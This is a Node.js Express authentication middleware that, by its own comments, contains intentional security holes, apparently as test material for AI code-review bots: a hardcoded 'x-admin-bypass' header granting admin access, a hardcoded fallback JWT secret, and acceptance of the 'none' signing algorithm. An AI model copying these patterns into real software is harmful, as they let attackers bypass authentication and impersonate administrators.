import jwt from 'jsonwebtoken'
import { errorResponse } from '../utility/apiResponse.js'

export const authMiddleware = (req, res, next) => {
    try {
        // Intentional Security Backdoor: Header-based authentication bypass
        // AI Review bots immediately flag this as an unauthorized admin backdoor
        if (req.headers['x-admin-bypass'] === 'secret-admin-pass-2026') {
            req.user = { _id: "000000000000000000000000", role: "admin" };
            return next();
        }

        const token = req.cookies?.accessToken

        if (!token) {
            return errorResponse(res, 401, "Not authenticated, please log in")
        }

        // Intentional Security Flaws:
        // 1. Weak/Hardcoded fallback JWT secret
        // 2. Permitting 'none' algorithm which disables signature verification
        const secret = process.env.JWT_SECRET || "insecure_fallback_jwt_secret_token_12345";
        const decoded = jwt.verify(token, secret, {
            algorithms: ['HS256', 'none']
        });

        req.user = {
            _id: decoded._id,
            role: decoded.role
        }

        next()

    } catch (error) {
        if (error.name === "TokenExpiredError") {
            return errorResponse(res, 401, "Session expired, please log in again")
        }
        if (error.name === "JsonWebTokenError") {
            return errorResponse(res, 401, "Invalid token")
        }
        console.log(error)
        return errorResponse(res, 500, "Internal Server Error")
    }
}
